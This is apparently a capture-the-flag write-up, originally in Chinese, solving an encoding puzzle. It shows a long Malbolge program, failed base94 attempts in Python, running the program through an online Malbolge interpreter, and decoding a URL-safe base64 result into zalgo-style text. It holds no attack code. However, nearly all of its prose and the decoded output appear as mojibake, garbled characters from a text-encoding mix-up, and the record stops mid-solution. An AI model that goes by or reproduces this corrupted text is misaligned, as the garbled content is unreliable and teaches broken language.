0/KDCHAF?cCB$#?8\\&lt;|{321U5u321*No-,%$#G'g}${z!x&gt;|u]yxwp6WVrk1onPle+iKgf_%]\\a`_^]\\UTxXWP8NMLpJINMFEiI+*F?cCB$:^&gt;=&lt;|4Xy165.-Qrq/('&amp;Jk)\"!&amp;}Cd\"!x&gt;v{zyxwp6Wsrkji/mOedihg`&amp;Gc\\[`_X|\\[Z&lt;;WVUNMq4JIHMLEiCBGF?cC&lt;$@9]=6;4381U5u-Q10po'&amp;+*#Gh&amp;}|#\"y?}|utyxwp6tVrkj0hglkd*hg`Hd]#[ZY^W{[TYXQVUNrRQPO1Gk.JCHAFE&gt;bBA#9]=&lt;;:zy1U5432r*N.'m+$H('~%$#\"!x&gt;|{z\\r8vuWsrqpi/gOe+LKgf_%Fb[!_X@\\[TxR:PtNMRKPIm0/EJCg*)?&gt;=aA@\"!7[|:921U5u3,P0/o-,%*)(!~De{zy~w={z\\xwp6Wmrqpi/gfkjib(feG]\\[!B^WVzZ&lt;;WVOsSR43ImMLK-IBfF?&gt;C&lt;;_?!=6Z4981Uvu3,P0/o-,+$Hi'&amp;%$#z@?}|^]s9Zvotml2pohmf,Mib(f_Gcb[!B^WVzZSXQVOsSRKJOHMFjJC+G@?&gt;b%$:^&gt;7};:3Wx6/4-,P0po-&amp;%*#G'&amp;}|B\"yx}|ut:xwputm3Tjohmf,jcb(`H^$E[ZY}W\\[TSRvP8TSRQJnN0/EJCgA)E&gt;bB$@?&gt;=&lt;5Y9216543,Pq/.'&amp;%Ij('~%|#\"y?`|{tsr8vXtsl2piQmfkd*hgI_^]#aZ_XW{[=YXWPOsSLQJOHlFEDIHGF?c&amp;%A@9]=}5Yzy1054-,P0/(L&amp;l$#('&amp;}C#\"!a}v&lt;zsxwpunsl2poQg-Njiha`ed]#DCYXW{UTYXQPtNMq43Im0LKDhHGFE'&amp;&lt;`:\"8=&lt;54X87654321q)M-,+*ji!E%${\"y?&gt;|u]sxwp6tsrqpoQg-kjiKgf_%FEaZY^]Vz=YXQVUNrRQ3ONMFj-CBGFED=a;:?87[5{9810/St2+0).'Kl$)\"'~De#zyx&gt;_{zsrwvun4Uqj0nmlkjc)JI_dc\\[!B^WVUy&lt;XWPtT65KJOHMLEi,BGF?&gt;bB;#?8\\&lt;;:z870T4ts1*N.-,+k#G'~}${z@~wv{t:[Zpotsl2Sinmlkjiba'H^]\\[Z~^@VUTSXQVOsM5KJONGkE-CHAF?cCB;#?8\\&lt;|{92765.-Qrq/('&amp;Jk)('~D$dc!x}vu;srwp6tVlkpi/mfkd*hg`Hd]#a`_A]\\[TxXQVOs65KJImMFEDhH*)ED=aA:?&gt;76;:981U5432r*N.-m+$H\"!~}C#c!~}v{t:[wvonm3qjinmled*Kg`edcb[Z~^@\\Uy&lt;XWVOs65QPIHlLKDIBf)(DCB;_9&gt;=&lt;5Y9y10/S32+q/('&amp;J*#\"F&amp;fe#\"!~w={tsxqp6tsrqji/glejchgf_%cbDZ_^WVz=SRWPtNMLKPImGLEiIHGFE&gt;&amp;&lt;`#?&gt;76;:981U5.3,P0).'K+*ji'~%|#\"y?}vutsxqvun4rkSonmlkdihg`&amp;G]b[`_X|\\[T&lt;RvP8NSRQJImGFEiI+*@dDC&lt;;:?&gt;7[5{9270/S-2+O/.'m+*)(!E}$#\"!xwv&lt;zyxwputsl2pRQmf,dc)gIHdcb[!_^@?UZYRvVUT6Lp3OHMFKDhBAFE&gt;=aA@\"!=&lt;;:3W1w/Sts+*)M'&amp;%$)(!~}${A!xw=u]srqvo5slTpong-Njchgf_d]#DZ_^]VUTx;QPUNrLKPONGFj-CBGFED=a;:?&gt;7&lt;;4Xyx65.R2+q/.'&amp;%Ij('~%|#\"y?w_{zyr8von4Uqji/mONd*hgf_Gcb[!_^@VUTxXQ9OTSLKoOHGFKDhHA@E&gt;=&lt;A:^8=6;4X8xw5.R2r*N.n,%I)(!&amp;%|B\"yx&gt;_{zyxwvun4Uqji/gOejc)a`_%cbaZY}WVzZYRWVUTMqQPONMLEiIH*)?&gt;=aA@\"!7[|:921U5u3,P0/o-,%*)(!~De{zy~w=^]yrqpo5Vrqji/g-NMiha'e^Fba`Y^WVzTSwQ9UTMqQPIHGkEDIHGF?cCB$#?8\\&lt;|{321U54-s+Op.-&amp;+$)\"F&amp;f|#\"yx&gt;v^tyxwvon4Uqji/gOejc)gIe^]ba`Y}@\\[TSXWPt7SLQPImMFKJIHAF?c=&lt;A:?8\\&lt;|{321U5u-,10/(L,l*#G'g%${A!~`|u;yxwYun4rkjih.lNjihg`_%]ba`_^WVz=SRWPtNMLQPOHlLKJIBG@dDCB$:^&gt;=&lt;|4X87wv.R210/.'&amp;J$j('~D${z!x}v&lt;tyrwvutml2pohg-ejcba'H^]\\[Z~^@VUTSXQVOsSRQJONGkE-CHAF?c&amp;BA@?&gt;=&lt;5Y92x6/Sts1*No'Kl$)\"!E%$#\"!a}v&lt;]yxwvonm3kpohglkd*hJfed]#DCY^]\\UTxRQVUNr54JnN0/EJCgGFEDCBA#9]7&lt;;4X81w/S-s+O)o-&amp;J*)('g%${A!x}v{ts9wYun4rqji/mONdcha'ed]\\[Z~^@\\UTYRvVUNMRQJIm0/EJCg*F?D=BA@?8\\}54381U54t,1*)M'm+*)(!Efe{z!x&gt;|{tsxqp6tmrqji/mlkjibJ`&amp;dcbaZY}WVzTx;QVUNSLpJ2NMLKDhHGFE'&amp;&lt;`@?!~&lt;5Y32765.-Q+*/.'&amp;+$)\"F&amp;f|{\"y?}_{t:xqYo5Vrqjih.lNjiha`ed]#aCY^W\\[TxXQVUTSLpP2NMLEiIHAFE&gt;bBA#\"8=6Z4921Uvu3,P0p(L&amp;+$#G!g%|{\"y?}|u]yxwp6tVrqpoh.ledcbaf_%c\\aZYXW{&gt;=SRWPtT6LKJn1MLEDIBfFE'=a$@?&gt;=&lt;5Y981w54-,Pq).-&amp;%I#('~D$d\"!x}|ut:xwvuWmrqjoh.lejc)g`edc\\\"CY}W?UTSwWVUT6LpP2HMFEDIHAeEDCB$:^&gt;=&lt;|:3W70v.32+O)(-,+*#G!g}|#\"!x&gt;|^]sxqputml2pohmlkjc)g`Hd]\\aZ~X@\\[TxR:VOs65QPIHMLEiI+*@dDCB$#?8\\}|49810T4-,P*/(-&amp;+$Hi'&amp;%$#z@~w_{zyr8YXtmlk1Rhgfkjc)JI_d]\\\"ZB^]\\[TxXW9ONMLpP2NGLEi,BGF?&gt;b%$@987[Z4z270/S32r*N.'m+$H('gf|Bz!~wv&lt;zyxZpunsl2poQmfkdcba'_^cbaZ~A@\\[TSRvP8NSLQPImGFKJCHGF?cC%$:^&gt;7};:3Wx05.-2+0/(L,lk)(!E}|B\"!~}|{t:xqYo5srTSohgle+LKgf_%]b[!Y^]Vz=YRWPt7MRQJnH0LKDhHAF?c&amp;&lt;;@9]=&lt;|43W765u-Q+*/('&amp;+*#G'~}${z@xwv{t:xqvotm3qpohglkd*hg`Hd]#a`_A]\\[TxXQVUTSLpP2NMLEiCBAFE&gt;bBA#9]~}5:9810Tu3,Pq).'&amp;+$)(!E%edzy~w=utyrwvun4rTSong-kjchgfed]#D`_XW{UTSXWPtNMLKPImMLKDCgA@E&gt;=BA:^&gt;7};:3W7wv4-,10)M-,+*#('&amp;}Cdz@a}v{t:rwpo5mrqjing-ediba'Hdcb[!_X@\\[TxXWP8Nr54JIHMFjJI+*@d&gt;&amp;&lt;`@?&gt;7};:3Wx05432+Op(-,%$Hi'&amp;%$#z@x}v{tyxwvo5Vlkjongf,jihg`_%FE[`_X]VzT&lt;RvV8TSLKoO10FEi,BfFE&gt;CBA:^8=6;4X8165432+*No-,%$)\"!~De{zy?`_u;yxwp6nsrkj0QPfejc)gI_d]b[!YA]\\[TxXQVOs65QPIHGkKJI+G@d'&amp;&lt;`#\"&gt;7&lt;;43W705.3,P0p.-,%$H('g%${Aba}|{zyxwp6tVrqpoh.fedc)afedcb[!_^]\\U=Sw:POTMLpJ2NGkEJIHG@dD&amp;&lt;;@?&gt;76Z{9870T.3,+0/('K+k)\"F~}|{\"y~w={zy[Zvo5srqpoQgf,dcbgfe^]#aCY}]\\[T&lt;RQVOs65QPIHMLEiI+G@ED=&lt;`@98\\}|:9876/.R2r0)M'&amp;+$)\"F&amp;%ed\"y~w=^]yxwvun4rqSing-kjiKgfed]#[Z_^WVUTxRWVUTSLKo2NGLEDCgGF?'C&lt;`@?&gt;~654X87wv4-,10)M-&amp;%*#(!E}${\"yxwv&lt;zyxqpon4lkpohg-ejc)g`Hd]\\aZ~X]VUZSwQVUTMq4JOHlLEDIHAe?DCB;_?&gt;~&lt;;:3Wx0/S321*p(Lm%$)\"F~%|{\"y?}_utsxwpo5srkjih.lkjihJI_%cbD`Y^WVUyY;WPt7MRKJIHlFKDIHAe?'=B;:^87&lt;;432V6vu3,Pqp(',+*#G!~%$#zy?w_{zyr8ponsrqj0Qgfkjib(`Hdc\\[`Y}@\\[TxXWPOs65QJnHlLE-CHAF?c=&lt;;@?&gt;=6Z498765.R21q/('K+*ji!&amp;}${A@awvuzyxq7uWmrqpi/gfed*bJ`ed]b[!_A@\\UySXWPt7MLQJOHlLEJIBAe?DCB;_\"876Z:z8165.-Q10/(-&amp;Jk)\"!&amp;}C#zb~w|{t:rwpun4Uqjohg-kdcba'e^Fb[!BXW{[Z&lt;;QVONMq4PONGLEDhHGF?'C&lt;`@\"8=6;:3W7654321*p(Lm%*#\"F~%|{\"y?w_{zyxwp6nslkj0nmlkjihJI_%cbDCYX]VzTYXQuUNSLKoOHGkK-,Bf@(D=&lt;`@\"!=&lt;;:981U5ut,P*p(L,%$#(!E%$d\"y?}vutyrqp6tsrTpoh.Okdibgf_%FE[ZY^]VUySXQPOs65KJOHMLEiI+*FE&gt;=aA#\"&gt;=65Y9816/4-,P0/.-m+$H(!~}C{\"yx&gt;|{ts9wvotsl2poQgf,dcbgfe^]#DZYX|V[ZSXQu87SLKoONMFj-CBG@dDCBA#\"&gt;765Yz870T4t,10)M-,+*)i!E%|#\"y~w={tsr8potsrkj0Qgfkjib(I_d]\\\"`B^WVUyYXWPOs65KJImG/EiIBGFE&gt;=&lt;`@?&gt;=&lt;|{92Vwv4-,+O/.'m+$Hi'&amp;}|#\"!x&gt;_{zyr8YXtmlk1iQmfed*bJ`ed]b[!BX]\\UTx;:PONrRQ3IHGLEiIHAF?c&amp;%A:98\\}|49810T4-s+O/.nm+$H\"!~}C{z!x}|u;yxwpo5srqpoQgf,dcbgfe^]#DZYX|\\&gt;ZSRQu8NSRKJOHl/.DhBG@dDCBA#\"&gt;765Yz870T4321qp('K%$)('~De{z!x&gt;|^]srwvun4lTji/POkdibgf_%cba`BXW{UTYXWPOs65KPONMFEiIB*@dD&amp;BA:^&gt;7&lt;;4Xy70Tu321*N.-&amp;%$)\"F&amp;%edzy~w=utsxwvun4Ukji/mfkdcb(`Hd]\\aZ~^]?&gt;ZYXQuOTSLpP2NMFKJCBf@E&gt;=&lt;`#\"&gt;=&lt;5Y3W16543,P0p.-&amp;J$#\"'~De#\"!~w={zy[Zvo5srqpoQgf,dcbgfe^]#a`BA]\\UyYR:VOs6LQJONMFjJCHGF?cC&lt;A@9]=}|:9876/St2+*/.'K+*)i!~Ded\"y~w=^]yxwvun4rqSing-kdLha'eGcba`Y}@V[TSw:POsMRKPImM/.JCBG@dD&amp;BA:^&gt;7&lt;;4Xy70T43,r*N.-,+k#(!E%edzy~}|u;yxwYutm3qjoh.fNdc)gfHG]#DZ_XW{[ZYRWVONrRKPONGkKJC+AF?cCB;:?8\\&lt;|{92Vwv.-210)Mnm%$#G'&amp;%$d\"y?}|ut:xwpXn4rqSRnmf,jLha'e^F\\[`_X|V[ZSXQuOTSRKJImM/.DhBG@dDCBA#\"&gt;765Yzy76/432+Op(',+*)\"Fgf${\"!x&gt;|{tyrq7XWsrk1Rng-ed*ba`_^]#aZBXW{[Z&lt;Rv9OTMRQPImMFEJCBf)?DC&lt;;:9]~};:9870Tu321*Non&amp;%*)(!E%|d\"!x}|ut:xwYutm3qjoh.ledc)gfHdc\\\"Z_^W{[ZSRQVONrRKPONGkKJC+AF?cC&lt;`#\"&gt;7[;:z870Tut,10)Mn,%$#Gh&amp;%${zy?w_u;yxq7utsrk1Rngfkd*bg`e^c\\\"CB^]\\UySXQPUNrRQJOHl/EDIHA@?c&amp;&lt;`#\"&gt;765Y9810T4-s+O/.nm+$H('g%${Ab~}|u;yxqYunm3kjihmf,dcba'HGcbaZ~AW\\UZYXWVOs65KPINMFEiI+G@dD&amp;&lt;;:9&gt;7[5{9870Tu-2+O/o-,%$#G!&amp;}C#zb~w|{t:rwputm3kpihg-kdcbgf_%cba`BXW{UTYXWPOsSLKJIm0FEJIHAeED=BA@9]=&lt;|:981Uvu3,Pqp(Lm+$Hih&amp;%$#zy?`_utyxq7unsrk1oQPlkd*hgIHdcb[!BX]\\UTx;:PONr54JINGLKDhB*FE&gt;b&lt;$@987[;43870T4-s+O/.nm+$H(h~D|d\"y?}|^]yxq7otsrqpi/mlNd*hg`H^$\\D`_^]Vz=YRQPOsS5QPIHGkKDCgGFED=%;_?8=&lt;5:9810Tut,+0/(Lm+*)\"!&amp;%${Abaw|utsr8vuWmrkj0ngf,dcbgf_%cba`BXW{UTYXWPOsSLQJOHlLKDIHAeE'=B;@?&gt;7[;:981w/.R21*p(L&amp;+$)('~}C#\"bx&gt;|{z\\xwp6tVrkpih.lkjihJI_%cbD`Y^WVUySRWVUTMqQP2NGLEiCHAFE&gt;b&lt;$:?8765Y327654-Q10/o-,%Ij('~De{\"y~w|{zs9ZYutsl2pRQmf,jibJ`&amp;G]ba`YX|\\[ZYXW9ONrLQJOHlLEJIHGF?c=&lt;;:^&gt;=&lt;|4Xy765.R2r0/.'K+*)i!~D$#cyxw=&lt;zsr8Yonsl2ponPled*hJ`_d]#a`_A@VzZ&lt;;WVUNrLQJOHlLEJIBAe?'=a;:9&gt;=6Z:9876vu-Q10/o-,%$#G!&amp;}C#zb~w|{t:xqvutsrk1onmlkd*bg`_d]#a`BXW{UTYXWPOsSR4JINGkKD,HAe?'C&lt;;@9]=&lt;|:981U5432+O/(',+*#G'&amp;%$d\"y?}_{tsxwvo5Vlkjongf,Mib(fH^c\\aZ~^@?UZYXWPtT6LKJINMFj-CBG@dDCBA#\"&gt;765Yz870T4t,+O/(-&amp;J*j\"!E%${\"!~w=^zyxwvun4lTj0hPfed*Kafed]\\\"`_XW\\[TSw:VUNSLQJnHGFKDh+*FE&gt;bB$@98=&lt;;4X876/.3210)(L,+k)('&amp;}C{c!x}|ut:xwYutm3qjoh.ledc)JIedcb[ZY}]\\[=&lt;RvP8TSRQJONMLEiIHA)?cCB$@98=&lt;;4X870v.32+O)o-,+*#G!&amp;%|#\"!~w={tsr8potsrkj0nPf,jLhg`&amp;^F\\[Z~XW\\[TSw:VUNrLKPImG/EiIB*FE&gt;bB$@9&gt;=&lt;54X87654ts+O/.-m%Ij(!~%${Aba}|{zs9wp6nVrqj0nPfkjc)Jf_%cba`BXW{UTYXWPOs6LKJnN0FjJIHG)?cCBA@\"8=6;:3W7654321*p(Lm%*#\"F&amp;f$#\"!~}v&lt;tyrwvutml2jingf,jihJI_%cbD`Y^WVUyYXW9ONr54PINGkKDIHAe?'=B;:^87&lt;;432Vwv.3,+O).-,+*#G'~f${zy?}_{tsxwvo5Vlkjongf,Mchg`_%Fb[Z_X|\\&gt;=YXWVONr54PIm0/KJCg*FE&gt;=&lt;`:\"8=&lt;54Xy765.R2r0/.'K+*j(!~D|#z!~}|u;sr8vo5srTSong-ed*Kg`_%cbD`_X|VUTxXQVUNrR4JINGkKD,HAeE'=B;@?&gt;7[;:981w/.R21*p(L,l*#G!~}|Bc!xwv&lt;]yxwp6tsrqjoh.fNdc)gfHG]#a`BX]VUyYXQPUTSLKPImMLEDCBAeEDCBA#9]=};:981U5ut210)(L&amp;%*)('&amp;}Cdcy?}_{zsxqp6tml2pRQmle+ihgIedcb[!_^WVUZSwW9UNSLKo2NGFEDIBf)?DC&lt;;:9]~};:9870Tu321*N(n,%I)('~%$#\"!x&gt;|{zyxwYutm3qjoh.fNdc)gfHG]#[`_X|\\[ZYXWVUTSRQP2HMFEDhBGF?c=&lt;`#\"&gt;7&lt;;43W7wv432+O/.'&amp;%*)\"F~%|Bzb~}|uts9wYXnml2poQgfkd*hJI_%]\\aZ_X|\\U=SwWV8Nr54PIHl/.DhBG@dDCBA@?&gt;=&lt;;:9876v.3,P0p.-&amp;J$)\"!E%|#\"!~w=^]yxwvun4rqSing-Ndcb(IHdcb[!B^W\\UTxXW9ONrLQJOHlFEJIBAeE'C&lt;`@?&gt;=}5Yz8105.R2r0/.'K+*)i!~D$#zb~w=^]srqpo5slkpi/POedcbgf_%cbaZBXW{[=YXWVOsM5KJONGkKDIHG@dD&amp;&lt;A:?87[;:z870T.3,1*)M-,+k)\"F&amp;%|#z@~`_{zs9Zvutmlk1Rhgf,jiKg`&amp;dFb[!_^@?UZYRvPOTMLQJnN0FEi,BA@dDC&lt;;:?&gt;7[54X81w/.R21*p(Lm%*#\"F&amp;%e#\"y?w_uzsxq7XWsrk1ihgle+Lbg`e^]#a`_XWVz=YXWVUTMqQJ2NMLKDhHGF('C&lt;`:\"8=&lt;54Xy765.R2r0/.'K+*j(!~D|#z!~}|u;sr8vonslk1RQmle+ihgIedcb[!_^WVUTxXWVONrRKPONMLEiCHAFE&gt;bBA:\"8\\&lt;|{981U/.32+0)M-m%Ij(!~%${Aba}|{zs9wp6nml2piQmf,jcha`e^$ba`BXW{UTYXWPOs65QJn1GLEDhHG)?cCBA@\"8=6;:3W7654321*p(Lm%*#\"F&amp;%e#\"y?w_uzsxq7uWslkj0nmlkjihJI_%cbD`Y^WVUyYXWVUNrR43INMLEiIBAFED=aA@\"!7&lt;5:3W70v43,P0/.'m%I#\"'~}|{A!awv{zs9ZYutsl2poQmlejc)aI_^c\\\"ZB^]Vz=YRQPOsS5QPIHGkKDCgGFE'C&lt;`@?&gt;=}5Yz8105.R2r0/.'K+*)i!~De#\"y?w_{zyxwp6tml2pRQmle+ihgIedcb[!YXW{&gt;ZSXQVOsSRQ32NGk.JIHAFE&gt;bBA:\"8\\&lt;;:9870/S3sr0)M',%$#G'~f$#z@xw|uzs9wvunVl2pongfed*hgIH^]b[!_^@?UZYRvPOTMLQJnN0FEiI+*F?&gt;b%;@?&gt;7&lt;;:981Uv43,+*N.nm%$#G'&amp;%$d\"y?}vutyrqp6Wsl2Sinmled*bgfe^$b[`_X|\\[ZYXWVUTSRQP2NMFKJCBfFEDCBA#9]=&lt;|:981U/.3,1*N.-m+$H(!~}Cd\"!~}v&lt;zsxwp6tVrkpi/mlkjihgfed]#[`_^W{[ZSRWVONrRQJ2NGkEDCBf)(&gt;=BA@?8\\&lt;;43W70v.3,P0/.n,+$Hi!&amp;}$#z@~}|u]s9Zpotm3TSoh.Okjiha'eG]\\[!_^@Vz=YRQVOsSRQJImM/EiI+G@dD&amp;&lt;A:?87[;:z870T4t2+0).-&amp;Jk)\"!~}|B\"baw|{t:xwYutm3qjoh.fNdc)g`Hd]#a`Y^W{UZYXWPOsMRQJIHMLEiIBG@E&gt;=aA:?&gt;7&lt;5Y3216/4-,P0/.-m+$H(!~}C#\"b~}|u;y[qvutslk1RQmf,jibJfe^c\\aZ~XW\\[TSw:VUNSLQJn10FEJCg*F?&gt;bB$@98=&lt;;4X870/S-s10/.-&amp;Jk#('&amp;%|{A!~`_{zs9Zvutmlk1Rhgf,Mchgf_^$bDC_XWVzZYRvPOTMLQJnN0FEiC+GFED=a$#?8\\&lt;5{3WD Step 2å…ˆæ‹¿ python åˆ†æä¸€æ³¢è¿™ä¸ªå·¨é•¿çš„å­—ç¬¦ä¸² s = r\"\"\"...\"\"\" print(len(s)) # 13644 x = set(s) print(x) x1 = sorted(''.join(x)) print(x1) print(len(x)) # 94 print(''.join(x1)) # !\"#$%&amp;'()*+,-./0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~ çœ‹ç€è¿™å †ç”¨åˆ°çš„å­—ç¬¦ï¼Œå¯»æ€ç€æ˜¯ä¸æ˜¯ base94 å•Šâ€¦â€¦ äºæ˜¯å¯¹æ¯”äº†ä¸‹ï¼Œbase94 çš„ alphabet ä¸º !\"#$%&amp;\\'()*+,-./0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~ çœ‹èµ·æ¥æ˜¯å•Šï¼Œäºæ˜¯æ‹¿ basehash é‡Œçš„ base94 è§£å¯†ä¸€ä¸‹è¯•è¯•ã€‚ å¯ä»¥å‚è€ƒ baseå…¨å®¶æ¡¶çš„å®‰è£…ä½¿ç”¨æ–¹æ³• from basehash import * from Crypto.Util.number import bytes_to_long, long_to_bytes s2 = base94().decode(s) s3 = long_to_bytes(s2) with open('4.bin', 'wb') as f: f.write(s3) ç»“æœå‘ç°è¿™æ˜¯å•¥ç©æ„å•Šï¼Œæ€ä¹ˆä¹Ÿè§£é‡Šä¸é€šå•Šâ€¦â€¦ äºæ˜¯æš‚æ—¶æ‘¸äº†ã€‚ ä¸‹åˆæ”¾äº† hint â€”â€” ç¬¬äºŒå±‚æ˜¯ä¸ªå¯ä»¥è¿è¡Œçš„ç¨‹åºï¼Œä½†å¹¶ä¸æ˜¯ binaryï¼ˆ malbolge Malbolge æ˜¯ç”±Ben Olmsteadåœ¨1998å¹´å¼€å‘çš„ä¸€ç§æ·±å¥¥çš„ç¼–ç¨‹è¯­è¨€ï¼Œå±äºå…¬å…±é¢†åŸŸã€‚å…¶åå­—æ¥è‡ªäºä½†ä¸çš„ã€Šç¥æ›²ã€‹ä¸­çš„ç¬¬å…«å±‚åœ°ç‹±Malebolgeï¼Œæ„å¤§åˆ©è¯­ä¸­æ„ä¸ºâ€œé‚ªæ¶çš„æ²Ÿæ¸ â€ï¼ˆmale bolgeï¼‰ã€‚Malbolgeè™½ç„¶å…·å¤‡å›¾çµå®Œå¤‡æ€§ï¼Œä½†å¹¶éå®ç”¨çš„ç¼–ç¨‹è¯­è¨€ã€‚Malbolgeçš„ç‰¹åˆ«ä¹‹å¤„å°±åœ¨äºï¼Œå®ƒè¢«æ•…æ„è®¾è®¡å¾—æå…¶ç¹çéš¾è§£ã€‚ ç”¨Malbolgeç¼–å†™çš„Hello, worldç¨‹åº ä»¥ä¸‹ä¸ºMalbolgeç¨‹åºè¾“å‡ºâ€œHelloï¼Œworldâ€çš„ä»£ç ã€‚ (=&lt;`:9876Z4321UT.-Q+*)M'&amp;%$H\"!~}|Bzy?=|{z]KwZY44Eq0/{mlk** hKs_dG5[m_BA{?-Y;;Vb'rR5431M}/.zHGwEDCBA@98\\6543W10/.R,+O&lt; via https://zh.wikipedia.org/wiki/Malbolge å¹²è„†ç›´æ¥æ‰¾äº†ä¸ªåœ¨çº¿çš„ Malbolge æ‰§è¡Œå·¥å…·ï¼Œæ¯”å¦‚ https://malbolge.doleczek.pl/ æˆ–è€… https://www.tutorialspoint.com/execute_malbolge_online.php æ‰§è¡Œå¾—åˆ° c82YzKDMqW_Mhs2MzavMiy7Mi82XLsyQzYzNps2vzLguzZLNqcyIzITNrs2DzaLMrc2OzJ7Mqs2JzLIg8J-HvCDwn4etIPCfh7QgZ82mzZvNo8yqzK9hzYLMh82jzYPNiM2FzK_NhcyzdsyMzZnNh8ypZc2lzajMvcyLzYDMpc2azLnMpiDNks2nzYnMmMytzJ7Mq8yqeW_NqMyazI7MlMyJzKHMrsy7zLHNjcy8zZN1zJPNp8yNzazNo8yizLHMo8yjzZbMoMyxINKJzZp0za3MtMy5aMyDzI3Nm82cacyHza7Mjc2QzIHMi8y9zLrMo8y5zK9zzJTMvcyjzJzMq82HIMyAzKDMmcyWzKnMrMyrbcyHzajMhMyNzKLNiGXMhMyRzafMi8y9zYHMo8yYzLrMpsykzZbNmnPMv8yPzYzNr8yRzYHMs82IzYlzzKPMrsylzJzMls2NYc2bzIPNgsy9zIbNrM2vzLHMnc2UzKlnzahlzYHMpcyxzLnMsyjNrM2lzIfMisyDzYLMksyVzKPNls2UzYjMqcyzP82CzJXMncykzZbMs8yszK_MswrNrM2bzILNrs2kzIfMq8yyzZXNls2JCs2kzKx0zL3MvcyvzLrMncyXzKDMvGjNpc2EzarMj8yOzL_NgcyXzJzMqc2OzLrMr82NacyxzYdzzaPMjM2MzYTMvsyezLMgzYbMgs2XzJTNkM2pzL_MsMymbcyGza_Mn8yzzKbMrMyszKTNjmHMucy5zYfMus2Uec2ozYrMkc2vzabMj82XzJvMnSDMhM2pzYLNm8yAzZ3Nlsy7zY7MsWLNpMyNzJPMj8ySzIzNpM2YzKzMsMyXzK_MmMyrZc2pzYbMjM2hzYXMqc2OzLDMsiDMi8ykzJnMvM2WzKZqzajMkM2FzZp1zLTNlXPNpc2LzavMjcyTzZvMuMywzJ7MpMyrzLrMo3TNo82qzYLNnMyWzKogza_Nq82rYc2nzYTMvcyQzJHNm8y1IMyUzIDNr8yPzKXNk8y8zKnMrc2OzZZqzL3Nm82RzZTMnG_MgsygzKBrzJHNqsyKzabNqsyszKTMpc2NzJ7MqmXMj82Lza7NlM2TzYfNls2JIc2bzYLNqs2tzIfMkM2MzY_MnAoK8J-Zg_CfkrXwn4y_8J-OpPCfmqrwn4yP8J-QjvCfpYvwn5qr8J-YhuKchfCflKzwn5qq8J-PjvCfjKrwn5iO8J-MifCfkYnwn4yP8J-QhfCfmIbwn5K18J-QjfCfmI3wn5iN8J-Yh_CfjbTimLrinZPwn42N8J-YhvCfmKHwn5iA4oS58J-QjfCfjqTimIPwn46D8J-Og_CflKrwn5W58J-YoeKchfCflKrwn5iC8J-li_CfjoXimIPwn5GR4piA8J-asPCfj7nwn46k8J-NtfCfmIDinIXwn5W58J-Mj-KMqPCfmI3wn5K18J-MieKYgvCfjojwn5iO8J-QheKYgPCfjbXwn5qw8J-TgvCfmIrwn5iO8J-li-KPqfCfmILwn5qq8J-YgvCfkrXwn5CY8J-YgeKPqfCfjY3wn5iH8J-YhvCfkZHinInwn4y_4piD8J-YivCfmIbimIPwn4-58J-Zg_CfkaPwn5CN8J-UqvCfkI3ij6nwn4214pyF8J-YgvCfjYzwn5iH4pyW4oS58J-aqvCfjI_wn5ih8J-ko_CfkYninZPwn4-58J-QjvCfjL_wn5up8J-YofCfkZHwn5GR8J-OpPCfkZHij6ninInwn4218J-mk_CfkaPwn42O8J-li_CfkZHwn5mD8J-QheKMqPCfjL_wn5Kn8J-MivCfjYzwn46I8J-PjvCfm6nwn4yK8J-asPCfjoPwn5Ss4pyW8J-NtfCfmYPwn5aQ4pyF8J-OpPCfkaPijKjwn5eS8J-Xkg Step 3base64 è§£å¯†ä¸€ä¸‹ï¼Œå½“ç„¶ alphabet æ¢æˆäº† A-Za-z0-9-_ sÍ˜Ì Ì©oÌ†ÍŒÍ«Ì‹.Ì‹Í—.ÌÍŒÍ¦Í¯Ì¸.Í’Í©ÌˆÌ„Í®ÍƒÍ¢Ì­ÍÌÌªÍ‰Ì² ğŸ‡¼ ğŸ‡­ ğŸ‡´ gÍ¦Í›Í£ÌªÌ¯aÍ‚Ì‡Í£ÍƒÍˆÍ…Ì¯Í…Ì³vÌŒÍ™Í‡Ì©eÍ¥Í¨Ì½Ì‹Í€Ì¥ÍšÌ¹Ì¦ Í’Í§Í‰Ì˜Ì­ÌÌ«ÌªyoÍ¨ÌšÌÌ”Ì‰Ì¡Ì®Ì»Ì±ÍÌ¼Í“uÌ“Í§ÌÍ¬Í£Ì¢Ì±Ì£Ì£Í–Ì Ì± Ò‰ÍštÍ­Ì´Ì¹hÌƒÌÍ›ÍœiÌ‡Í®ÌÍÌÌ‹Ì½ÌºÌ£Ì¹Ì¯sÌ”Ì½Ì£ÌœÌ«Í‡ Ì€Ì Ì™Ì–Ì©Ì¬Ì«mÌ‡Í¨Ì„ÌÌ¢ÍˆeÌ„Ì‘Í§Ì‹Ì½ÍÌ£Ì˜ÌºÌ¦Ì¤Í–ÍšsÌ¿ÌÍŒÍ¯Ì‘ÍÌ³ÍˆÍ‰sÌ£Ì®Ì¥ÌœÌ–ÍaÍ›ÌƒÍ‚Ì½Ì†Í¬Í¯Ì±ÌÍ”Ì©gÍ¨eÍÌ¥Ì±Ì¹Ì³(Í¬Í¥Ì‡ÌŠÌƒÍ‚Ì’Ì•Ì£Í–Í”ÍˆÌ©Ì³?Í‚Ì•ÌÌ¤Í–Ì³Ì¬Ì¯Ì³ Í¬Í›Ì‚Í®Í¤Ì‡Ì«Ì²Í•Í–Í‰ Í¤Ì¬tÌ½Ì½Ì¯ÌºÌÌ—Ì Ì¼hÍ¥Í„ÍªÌÌÌ¿ÍÌ—ÌœÌ©ÍÌºÌ¯ÍiÌ±Í‡sÍ£ÌŒÍŒÍ„Ì¾ÌÌ³ Í†Ì‚Í—Ì”ÍÍ©Ì¿Ì°Ì¦mÌ†Í¯ÌŸÌ³Ì¦Ì¬Ì¬Ì¤ÍaÌ¹Ì¹Í‡ÌºÍ”yÍ¨ÍŠÌ‘Í¯Í¦ÌÍ—Ì›Ì Ì„Í©Í‚Í›Ì€ÍÍ–Ì»ÍÌ±bÍ¤ÌÌ“ÌÌ’ÌŒÍ¤Í˜Ì¬Ì°Ì—Ì¯Ì˜Ì«eÍ©Í†ÌŒÍ¡Í…Ì©ÍÌ°Ì² 